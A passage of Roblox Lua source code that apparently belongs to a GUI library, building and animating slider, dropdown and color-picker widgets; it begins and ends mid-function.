            if default == true then
                ToggleCircle:TweenPosition(UDim2.new(0.37, 0,-0.273, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .3, true)
                TweenService:Create(
                    ToggleCircle,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 =PresetColor}
                ):Play()
                Toggled = not Toggled
                pcall(callback, Toggled)
            end
            Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
        end

        function ContainerContent:Slider(text,min,max,start,callback)
            local SliderFunc = {}
            local SliderDescToggled = false
            local dragging = false
            local Slider = Instance.new("TextButton")
            local SliderCorner = Instance.new("UICorner")
            local Title = Instance.new("TextLabel")
            local Circle = Instance.new("Frame")
            local CircleCorner = Instance.new("UICorner")
            local CircleSmall = Instance.new("Frame")
            local CircleSmallCorner = Instance.new("UICorner")
            local SlideFrame = Instance.new("Frame")
            local CurrentValueFrame = Instance.new("Frame")
            local SlideCircle = Instance.new("ImageButton")
            local Value = Instance.new("TextLabel")

            Slider.Name = "Slider"
            Slider.Parent = Container
            Slider.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Slider.ClipsDescendants = true
            Slider.Position = UDim2.new(0.189062506, 0, 0.648612201, 0)
            Slider.Size = UDim2.new(0, 457, 0, 60)
            Slider.AutoButtonColor = false
            Slider.Font = Enum.Font.SourceSans
            Slider.Text = ""
            Slider.TextColor3 = Color3.fromRGB(0, 0, 0)
            Slider.TextSize = 14.000

            SliderCorner.CornerRadius = UDim.new(0, 4)
            SliderCorner.Name = "SliderCorner"
            SliderCorner.Parent = Slider

            Title.Name = "Title"
            Title.Parent = Slider
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Position = UDim2.new(0.0822437406, 0, 0, 0)
            Title.Size = UDim2.new(0, 113, 0, 42)
            Title.Font = Enum.Font.Gotham
            Title.Text = text
            Title.TextColor3 = Color3.fromRGB(255, 255, 255)
            Title.TextSize = 15.000
            Title.TextTransparency = 0.300
            Title.TextXAlignment = Enum.TextXAlignment.Left

            Circle.Name = "Circle"
            Circle.Parent = Title
            Circle.Active = true
            Circle.AnchorPoint = Vector2.new(0.5, 0.5)
            Circle.BackgroundColor3 = Color3.fromRGB(211, 211, 211)
            Circle.Position = UDim2.new(-0.150690272, 0, 0.503000021, 0)
            Circle.Size = UDim2.new(0, 11, 0, 11)


            CircleCorner.CornerRadius = UDim.new(2, 6)
            CircleCorner.Name = "CircleCorner"
            CircleCorner.Parent = Circle

            CircleSmall.Name = "CircleSmall"
            CircleSmall.Parent = Circle
            CircleSmall.Active = true
            CircleSmall.AnchorPoint = Vector2.new(0.5, 0.5)
            CircleSmall.BackgroundColor3 = Color3.fromRGB(64, 68, 75)
            CircleSmall.BackgroundTransparency = 1.000
            CircleSmall.Position = UDim2.new(0.485673368, 0, 0.503000021, 0)
            CircleSmall.Size = UDim2.new(0, 9, 0, 9)

            CircleSmallCorner.CornerRadius = UDim.new(2, 6)
            CircleSmallCorner.Name = "CircleSmallCorner"
            CircleSmallCorner.Parent = CircleSmall


            SlideFrame.Name = "SlideFrame"
            SlideFrame.Parent = Title
            SlideFrame.BackgroundColor3 = Color3.fromRGB(235, 234, 235)
            SlideFrame.BorderSizePixel = 0
            SlideFrame.Position = UDim2.new(-0.197140202, 0, 0.986091495, 0)
            SlideFrame.Size = UDim2.new(0, 426, 0, 3)

            CurrentValueFrame.Name = "CurrentValueFrame"
            CurrentValueFrame.Parent = SlideFrame
            CurrentValueFrame.BackgroundColor3 = PresetColor
            CurrentValueFrame.BorderSizePixel = 0
            CurrentValueFrame.Size = UDim2.new((start or 0) / max, 0, 0, 3)

            SlideCircle.Name = "SlideCircle"
            SlideCircle.Parent = SlideFrame
            SlideCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SlideCircle.BackgroundTransparency = 1.000
            SlideCircle.Position = UDim2.new((start or 0)/max, -6,-1.30499995, 0)
            SlideCircle.Size = UDim2.new(0, 11, 0, 11)
            SlideCircle.Image = "rbxassetid://3570695787"
            SlideCircle.ImageColor3 = PresetColor

            Value.Name = "Value"
            Value.Parent = Title
            Value.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Value.BackgroundTransparency = 1.000
            Value.Position = UDim2.new(2.27693367, 0, 0, 0)
            Value.Size = UDim2.new(0, 113, 0, 41)
            Value.Font = Enum.Font.Gotham
            Value.Text = tostring(start and math.floor((start / max) * (max - min) + min) or 0)
            Value.TextColor3 = Color3.fromRGB(255, 255, 255)
            Value.TextSize = 15.000
            Value.TextTransparency = 0.300
            Value.TextXAlignment = Enum.TextXAlignment.Right


            local function move(input)
                local pos =
                    UDim2.new(
                        math.clamp((input.Position.X - SlideFrame.AbsolutePosition.X) / SlideFrame.AbsoluteSize.X, 0, 1),
                        -6,
                        -1.30499995,
                        0
                    )
                local pos1 =
                    UDim2.new(
                        math.clamp((input.Position.X - SlideFrame.AbsolutePosition.X) / SlideFrame.AbsoluteSize.X, 0, 1),
                        0,
                        0,
                        3
                    )
                CurrentValueFrame:TweenSize(pos1, "Out", "Sine", 0.1, true)
                SlideCircle:TweenPosition(pos, "Out", "Sine", 0.1, true)
                local value = math.floor(((pos.X.Scale * max) / max) * (max - min) + min)
                Value.Text = tostring(value)
                pcall(callback, value)
            end
            SlideCircle.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        dragging = true
                    end
                end
            )
            SlideCircle.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        dragging = false
                    end
                end
            )
            game:GetService("UserInputService").InputChanged:Connect(
            function(input)
                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                    move(input)
                end
            end
            )
            Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
            function SliderFunc:Change(tochange)
                CurrentValueFrame.Size = UDim2.new((tochange or 0) / max, 0, 0, 3)
                SlideCircle.Position = UDim2.new((tochange or 0)/max, -6,-1.30499995, 0)
                Value.Text = tostring(tochange and math.floor((tochange / max) * (max - min) + min) or 0)
                pcall(callback,tochange)
            end
            return SliderFunc
        end
        function ContainerContent:Dropdown(text,list,callback)
            local DropFunc = {}
            local Selected = text
            local FrameSize = 43
            local ItemCount = 0
            local DropToggled = false
            local Dropdown = Instance.new("TextButton")
            local DropdownCorner = Instance.new("UICorner")
            local Title = Instance.new("TextLabel")
            local Circle = Instance.new("Frame")
            local CircleCorner = Instance.new("UICorner")
            local CircleSmall = Instance.new("Frame")
            local CircleSmallCorner = Instance.new("UICorner")
            local ArrowIco = Instance.new("ImageLabel")
            local DropItemHolder = Instance.new("ScrollingFrame")
            local DropLayout = Instance.new("UIListLayout")

            Dropdown.Name = "Dropdown"
            Dropdown.Parent = Container
            Dropdown.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Dropdown.ClipsDescendants = true
            Dropdown.Position = UDim2.new(0.110937499, 0, 0.67653507, 0)
            Dropdown.Size = UDim2.new(0, 457, 0, 43)
            Dropdown.AutoButtonColor = false
            Dropdown.Font = Enum.Font.SourceSans
            Dropdown.Text = ""
            Dropdown.TextColor3 = Color3.fromRGB(0, 0, 0)
            Dropdown.TextSize = 14.000

            DropdownCorner.CornerRadius = UDim.new(0, 4)
            DropdownCorner.Name = "DropdownCorner"
            DropdownCorner.Parent = Dropdown

            Title.Name = "Title"
            Title.Parent = Dropdown
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Position = UDim2.new(0.0822437406, 0, 0, 0)
            Title.Size = UDim2.new(0, 113, 0, 42)
            Title.Font = Enum.Font.Gotham
            Title.Text = text
            Title.TextColor3 = Color3.fromRGB(255, 255, 255)
            Title.TextSize = 15.000
            Title.TextTransparency = 0.300
            Title.TextXAlignment = Enum.TextXAlignment.Left

            Circle.Name = "Circle"
            Circle.Parent = Title
            Circle.Active = true
            Circle.AnchorPoint = Vector2.new(0.5, 0.5)
            Circle.BackgroundColor3 = Color3.fromRGB(211, 211, 211)
            Circle.Position = UDim2.new(-0.150690272, 0, 0.503000021, 0)
            Circle.Size = UDim2.new(0, 11, 0, 11)

            CircleCorner.CornerRadius = UDim.new(2, 6)
            CircleCorner.Name = "CircleCorner"
            CircleCorner.Parent = Circle

            CircleSmall.Name = "CircleSmall"
            CircleSmall.Parent = Circle
            CircleSmall.Active = true
            CircleSmall.AnchorPoint = Vector2.new(0.5, 0.5)
            CircleSmall.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            CircleSmall.BackgroundTransparency = 1.000
            CircleSmall.Position = UDim2.new(0.485673368, 0, 0.503000021, 0)
            CircleSmall.Size = UDim2.new(0, 9, 0, 9)

            CircleSmallCorner.CornerRadius = UDim.new(2, 6)
            CircleSmallCorner.Name = "CircleSmallCorner"
            CircleSmallCorner.Parent = CircleSmall

            ArrowIco.Name = "ArrowIco"
            ArrowIco.Parent = Title
            ArrowIco.AnchorPoint = Vector2.new(0.5, 0.5)
            ArrowIco.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ArrowIco.BackgroundTransparency = 1.000
            ArrowIco.Position = UDim2.new(3.45979357, 0, 0.508096159, 0)
            ArrowIco.Selectable = true
            ArrowIco.Size = UDim2.new(0, 28, 0, 24)
            ArrowIco.Image = "http://www.roblox.com/asset/?id=6035047377"
            ArrowIco.ImageTransparency = .3

            DropItemHolder.Name = "DropItemHolder"
            DropItemHolder.Parent = Title
            DropItemHolder.Active = true
            DropItemHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropItemHolder.BackgroundTransparency = 1.000
            DropItemHolder.BorderSizePixel = 0
            DropItemHolder.Position = UDim2.new(-0.203539819, 0, 1.02380955, 0)
            DropItemHolder.Size = UDim2.new(0, 436, 0, 82)
            DropItemHolder.CanvasSize = UDim2.new(0, 0, 0, 0)
            DropItemHolder.ScrollBarThickness = 5
            DropItemHolder.ScrollBarImageColor3 = Color3.fromRGB(35, 35, 35)

            DropLayout.Name = "DropLayout"
            DropLayout.Parent = DropItemHolder
            DropLayout.SortOrder = Enum.SortOrder.LayoutOrder
            DropLayout.Padding = UDim.new(0, 2)

            Dropdown.MouseEnter:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0}
                ):Play()
            end)

            Dropdown.MouseLeave:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0.3}
                ):Play()
            end)


            Dropdown.MouseButton1Click:Connect(function()
                if DropToggled == false then
                    Title.Text = Selected
                    Dropdown:TweenSize(UDim2.new(0, 457, 0, FrameSize), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = PresetColor}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageColor3 = PresetColor}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = 0}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {Rotation = 180}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = PresetColor}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 0}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
                else
                    Title.Text = Selected
                    Dropdown:TweenSize(UDim2.new(0, 457, 0, 43), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = .3}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {Rotation = 0}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(211, 211, 211)}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
                end
                DropToggled = not DropToggled
            end)

            for i,v in next, list do
                ItemCount = ItemCount + 1

                if ItemCount == 1 then
                    FrameSize = 78
                elseif ItemCount == 2 then
                    FrameSize = 107
                elseif ItemCount >= 3 then
                    FrameSize = 133
                end
                local Item = Instance.new("TextButton")
                local ItemCorner = Instance.new("UICorner")

                Item.Name = "Item"
                Item.Parent = DropItemHolder
                Item.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                Item.ClipsDescendants = true
                Item.Size = UDim2.new(0, 427, 0, 25)
                Item.AutoButtonColor = false
                Item.Font = Enum.Font.Gotham
                Item.Text = v
                Item.TextColor3 = Color3.fromRGB(255, 255, 255)
                Item.TextSize = 15.000
                Item.TextTransparency = 0.300

                ItemCorner.CornerRadius = UDim.new(0, 4)
                ItemCorner.Name = "ItemCorner"
                ItemCorner.Parent = Item
                DropItemHolder.CanvasSize = UDim2.new(0, 0, 0, DropLayout.AbsoluteContentSize.Y)

                Item.MouseEnter:Connect(function()
                    TweenService:Create(
                        Item,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                end)

                Item.MouseLeave:Connect(function()
                    TweenService:Create(
                        Item,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                end)

                Item.MouseButton1Click:Connect(function()
                    pcall(callback, v)
                    Title.Text = text
                    Selected = v
                    DropToggled = not DropToggled
                    Dropdown:TweenSize(UDim2.new(0, 457, 0, 43), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = .3}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {Rotation = 0}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(211, 211, 211)}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)

                end)
            end
            function DropFunc:Add(addtext)
                ItemCount = ItemCount + 1

                if ItemCount == 1 then
                    FrameSize = 78
                elseif ItemCount == 2 then
                    FrameSize = 107
                elseif ItemCount >= 3 then
                    FrameSize = 133
                end
                local Item = Instance.new("TextButton")
                local ItemCorner = Instance.new("UICorner")

                Item.Name = "Item"
                Item.Parent = DropItemHolder
                Item.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                Item.ClipsDescendants = true
                Item.Size = UDim2.new(0, 427, 0, 25)
                Item.AutoButtonColor = false
                Item.Font = Enum.Font.Gotham
                Item.Text = addtext
                Item.TextColor3 = Color3.fromRGB(255, 255, 255)
                Item.TextSize = 15.000
                Item.TextTransparency = 0.300

                ItemCorner.CornerRadius = UDim.new(0, 4)
                ItemCorner.Name = "ItemCorner"
                ItemCorner.Parent = Item
                DropItemHolder.CanvasSize = UDim2.new(0, 0, 0, DropLayout.AbsoluteContentSize.Y)

                Item.MouseEnter:Connect(function()
                    TweenService:Create(
                        Item,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                end)

                Item.MouseLeave:Connect(function()
                    TweenService:Create(
                        Item,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                end)

                Item.MouseButton1Click:Connect(function()
                    pcall(callback, addtext)
                    Title.Text = text
                    Selected = addtext
                    DropToggled = not DropToggled
                    Dropdown:TweenSize(UDim2.new(0, 457, 0, 43), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = .3}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {Rotation = 0}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(211, 211, 211)}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
                end)
                if DropToggled == true then
                    Title.Text = Selected
                    Dropdown:TweenSize(UDim2.new(0, 457, 0, 43), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = .3}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {Rotation = 0}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(211, 211, 211)}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
                end
            end
            function DropFunc:Clear()
                Title.Text = text
                FrameSize = 0
                ItemCount = 0
                for i, v in next, DropItemHolder:GetChildren() do
                    if v.Name == "Item" then
                        v:Destroy()
                    end
                end
                if DropToggled == true then
                    Title.Text = Selected
                    Dropdown:TweenSize(UDim2.new(0, 457, 0, 43), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = .3}
                    ):Play()
                    TweenService:Create(
                        ArrowIco,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {Rotation = 0}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(211, 211, 211)}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
                end
            end
            return DropFunc
        end
        function ContainerContent:Colorpicker(text,preset,callback)
            local ColorPickerToggled = false
            local OldToggleColor = Color3.fromRGB(0, 0, 0)
            local OldColor = Color3.fromRGB(0, 0, 0)
            local OldColorSelectionPosition = nil
            local OldHueSelectionPosition = nil
            local ColorH, ColorS, ColorV = 1, 1, 1
            local RainbowColorPicker = false
            local ColorPickerInput = nil
            local ColorInput = nil
            local HueInput = nil

            local Colorpicker = Instance.new("Frame")
            local ColorpickerCorner = Instance.new("UICorner")
            local Title = Instance.new("TextLabel")
            local Circle = Instance.new("Frame")
            local CircleCorner = Instance.new("UICorner")
            local CircleSmall = Instance.new("Frame")
            local CircleSmallCorner = Instance.new("UICorner")
            local Hue = Instance.new("ImageLabel")
            local HueCorner = Instance.new("UICorner")
            local HueGradient = Instance.new("UIGradient")
            local HueSelection = Instance.new("ImageLabel")
            local Color = Instance.new("ImageLabel")
            local ColorCorner = Instance.new("UICorner")
            local ColorSelection = Instance.new("ImageLabel")
            local Toggle = Instance.new("TextLabel")
            local ToggleFrame = Instance.new("Frame")
            local ToggleFrameCorner = Instance.new("UICorner")
            local ToggleCircle = Instance.new("Frame")
            local ToggleCircleCorner = Instance.new("UICorner")
            local Confirm = Instance.new("TextButton")
            local ConfirmCorner = Instance.new("UICorner")
            local ConfirmTitle = Instance.new("TextLabel")
            local BoxColor = Instance.new("Frame")
            local BoxColorCorner = Instance.new("UICorner")
            local ColorpickerBtn = Instance.new("TextButton")
            local ToggleBtn = Instance.new("TextButton")


            Colorpicker.Name = "Colorpicker"
            Colorpicker.Parent = Container
            Colorpicker.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Colorpicker.ClipsDescendants = true
            Colorpicker.Position = UDim2.new(0.110937499, 0, 0.67653507, 0)
            Colorpicker.Size = UDim2.new(0, 457, 0, 43)

            ColorpickerCorner.CornerRadius = UDim.new(0, 4)
            ColorpickerCorner.Name = "ColorpickerCorner"
            ColorpickerCorner.Parent = Colorpicker

            Title.Name = "Title"
            Title.Parent = Colorpicker
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Position = UDim2.new(0.0822437406, 0, 0, 0)
            Title.Size = UDim2.new(0, 113, 0, 42)
            Title.Font = Enum.Font.Gotham
            Title.Text = "UI Color Setting"
            Title.TextColor3 = Color3.fromRGB(255, 255, 255)
            Title.TextSize = 15.000
            Title.TextTransparency = 0.300
            Title.TextXAlignment = Enum.TextXAlignment.Left


            ColorpickerBtn.Name = "ColorpickerBtn"
            ColorpickerBtn.Parent = Title
            ColorpickerBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ColorpickerBtn.BackgroundTransparency = 1.000
            ColorpickerBtn.Position = UDim2.new(-0.336283177, 0, 0, 0)
            ColorpickerBtn.Size = UDim2.new(0, 457, 0, 42)
            ColorpickerBtn.Font = Enum.Font.SourceSans
            ColorpickerBtn.Text = ""
            ColorpickerBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            ColorpickerBtn.TextSize = 14.000

            Circle.Name = "Circle"
            Circle.Parent = Title
            Circle.Active = true
            Circle.AnchorPoint = Vector2.new(0.5, 0.5)
            Circle.BackgroundColor3 = Color3.fromRGB(211, 211, 211)
            Circle.Position = UDim2.new(-0.150690272, 0, 0.503000021, 0)
            Circle.Size = UDim2.new(0, 11, 0, 11)

            CircleCorner.CornerRadius = UDim.new(2, 6)
            CircleCorner.Name = "CircleCorner"
            CircleCorner.Parent = Circle

            CircleSmall.Name = "CircleSmall"
            CircleSmall.Parent = Circle
            CircleSmall.Active = true
            CircleSmall.AnchorPoint = Vector2.new(0.5, 0.5)
            CircleSmall.BackgroundColor3 = Color3.fromRGB(64, 68, 75)
            CircleSmall.BackgroundTransparency = 1.000
            CircleSmall.Position = UDim2.new(0.485673368, 0, 0.503000021, 0)
            CircleSmall.Size = UDim2.new(0, 9, 0, 9)

            CircleSmallCorner.CornerRadius = UDim.new(2, 6)
            CircleSmallCorner.Name = "CircleSmallCorner"
            CircleSmallCorner.Parent = CircleSmall

            Hue.Name = "Hue"
            Hue.Parent = Title
            Hue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Hue.Position = UDim2.new(0, 229, 0, 46)
            Hue.Size = UDim2.new(0, 25, 0, 80)

            HueCorner.CornerRadius = UDim.new(0, 3)
            HueCorner.Name = "HueCorner"
            HueCorner.Parent = Hue

            HueGradient.Color = ColorSequence.new {
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)),
                ColorSequenceKeypoint.new(0.20, Color3.fromRGB(234, 255, 0)),
                ColorSequenceKeypoint.new(0.40, Color3.fromRGB(21, 255, 0)),
                ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 255)),
                ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 17, 255)),
                ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 0, 251)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 4))
            }			
            HueGradient.Rotation = 270
            HueGradient.Name = "HueGradient"
            HueGradient.Parent = Hue

            HueSelection.Name = "HueSelection"
            HueSelection.Parent = Hue
            HueSelection.AnchorPoint = Vector2.new(0.5, 0.5)
            HueSelection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            HueSelection.BackgroundTransparency = 1.000
            HueSelection.Position = UDim2.new(0.48, 0, 1 - select(1, Color3.toHSV(preset)))
            HueSelection.Size = UDim2.new(0, 18, 0, 18)
            HueSelection.Image = "http://www.roblox.com/asset/?id=4805639000"
            HueSelection.Visible = false

            Color.Name = "Color"
            Color.Parent = Title
            Color.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
            Color.Position = UDim2.new(0, -23, 0, 46)
            Color.Size = UDim2.new(0, 246, 0, 80)
            Color.ZIndex = 10
            Color.Image = "rbxassetid://4155801252"

            ColorCorner.CornerRadius = UDim.new(0, 3)
            ColorCorner.Name = "ColorCorner"
            ColorCorner.Parent = Color

            ColorSelection.Name = "ColorSelection"
            ColorSelection.Parent = Color
            ColorSelection.AnchorPoint = Vector2.new(0.5, 0.5)
            ColorSelection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ColorSelection.BackgroundTransparency = 1.000
            ColorSelection.Position = UDim2.new(preset and select(3, Color3.toHSV(preset)))
            ColorSelection.Size = UDim2.new(0, 18, 0, 18)
